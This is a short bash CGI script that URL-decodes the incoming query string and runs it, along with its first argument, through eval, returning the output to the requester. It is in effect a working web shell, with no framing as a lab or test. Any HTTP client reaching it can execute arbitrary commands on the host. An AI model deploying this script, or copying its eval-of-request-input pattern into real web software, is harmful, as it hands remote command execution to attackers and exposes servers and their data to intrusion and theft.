#!/bin/bash
echo "Content-type: text/plain"
echo ""
function urlDecode() {
  : "${*//+/ }"
  echo -e "${_//%/\\x}"
}
set -xv
COMMAND=$(urlDecode "${QUERY_STRING}")
echo "Argument #1:  ${1}"
echo "QUERY_STRING: ${QUERY_STRING}"
echo "COMMAND:      ${COMMAND}"
echo ""
eval "${1}" 2>&1
echo ""
eval "${COMMAND}" 2>&1
